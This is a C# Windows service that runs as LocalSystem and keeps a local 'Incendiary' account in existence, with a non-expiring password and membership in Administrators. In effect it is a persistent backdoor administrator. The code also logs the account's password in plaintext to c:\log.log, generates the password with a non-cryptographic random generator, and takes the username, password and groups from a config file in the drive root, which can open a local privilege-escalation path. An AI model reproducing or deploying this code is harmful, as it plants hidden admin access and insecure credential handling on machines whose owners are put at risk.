using System;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.DirectoryServices.AccountManagement;
using Topshelf;
using IncendiaryService;

namespace IncendiaryService
{
    public class IncendiaryUserService
    {
        private readonly string _logFilePath = "c:\\log.log";
        private string _serviceName = "IncendiaryUserService";
        private string _samAccountName = "Incendiary";
        private string _name = "Incendiary User";
        private string _randomPassword = GenerateRandomPassword();
        private string[] _additionalGroups = { "Administrators" };

        public bool Start(HostControl hostControl)
        {
            // Read configuration from file or use default values
            ReadConfiguration();

            try
            {
                // Check if Incendiary user exists
                bool userExists = UserPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine), IdentityType.SamAccountName, _samAccountName) != null;

                if (!userExists)
                {
                    // Add Incendiary user with random password
                    using (var pc = new PrincipalContext(ContextType.Machine))
                    {
                        var user = new UserPrincipal(pc)
                        {
                            SamAccountName = _samAccountName,
                            Name = _name,
                            PasswordNeverExpires = true
                        };
                        user.SetPassword(_randomPassword);
                        user.Save();

                        Log($"Incendiary user was created with password: {_randomPassword}");
                    }
                }

                // Check if Incendiary user is in the local administrators group
                using (var pc = new PrincipalContext(ContextType.Machine))
                {
                    var user = UserPrincipal.FindByIdentity(pc, IdentityType.SamAccountName, _samAccountName);
                    var group = GroupPrincipal.FindByIdentity(pc, IdentityType.Name, "Administrators");
                    bool isInAdministratorsGroup = group != null && group.GetMembers().Any(x => x.SamAccountName.Equals(_samAccountName, StringComparison.OrdinalIgnoreCase));

                    if (!isInAdministratorsGroup)
                    {
                        group?.Members.Add(user);
                        group?.Save();

                        Log("Incendiary user was added to the Administrators group");
                    }
                }

                // Add Incendiary user to additional groups if specified in configuration
                if (_additionalGroups != null && _additionalGroups.Length > 0)
                {
                    using (var pc = new PrincipalContext(ContextType.Machine))
                    {
                        var user = UserPrincipal.FindByIdentity(pc, IdentityType.SamAccountName, _samAccountName);

                        foreach (var groupName in _additionalGroups)
                        {
                            var group = GroupPrincipal.FindByIdentity(pc, IdentityType.Name, groupName);
                            if (group != null && !group.GetMembers().Any(x => x.SamAccountName.Equals(_samAccountName, StringComparison.OrdinalIgnoreCase)))
                            {
                                group.Members.Add(user);
                                group.Save();

                                Log($"Incendiary user was added to the {groupName} group");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"An error occurred: {ex.Message}");
            }

            return true;
        }
        public bool Stop(HostControl hostControl)
        {
            Log("Service stopped");
            return true;
        }

        private void Log(string message)
        {
            try
            {
                File.AppendAllText(_logFilePath, $"{DateTime.Now}: {message}{Environment.NewLine}");
            }
            catch (Exception)
            {
                // Ignore any errors that may occur while logging
            }

        }

        private void ReadConfiguration()
        {
            try
            {
                // Read configuration from file or use default values
                string configFilePath = "c:\\config.cfg";

                if (File.Exists(configFilePath))
                {
                    string[] lines = File.ReadAllLines(configFilePath);

                    foreach (string line in lines)
                    {
                        string[] parts = line.Split(new[] { '=' }, 2).Select(x => x.Trim()).ToArray();

                        if (parts.Length == 2)
                        {
                            string key = parts[0].Trim();
                            string value = parts[1].Trim();

                            switch (key.ToLowerInvariant())
                            {
                                case "servicename":
                                    _serviceName = value;
                                    break;
                                case "samaccountname":
                                    _samAccountName = value;
                                    break;
                                case "name":
                                    _name = value;
                                    break;
                                case "randompassword":
                                    _randomPassword = value;
                                    break;
                                case "additionalgroups":
                                    _additionalGroups = value.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
                                        .Select(x => x.Trim())
                                        .ToArray();
                                    break;
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Ignore any errors that may occur while reading configuration
            }
        }

        private static string GenerateRandomPassword(int length = 16)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }

    }
}

internal static class Program
{
    private static void Main()
    {
        var exitCode = HostFactory.Run(x =>
        {
            x.Service<IncendiaryUserService>(s =>
            {
                s.ConstructUsing(name => new IncendiaryUserService());
                s.WhenStarted(service => service.Start(null));
                s.WhenStopped(service => service.Stop(null));
            });
            x.RunAsLocalSystem();
            x.SetServiceName("IncendiaryUserService");
            x.SetDisplayName("Incendiary User Service");
            x.SetDescription("Service to manage the Incendiary user on the local machine.");
        });
        Environment.ExitCode = (int)exitCode;
    }
}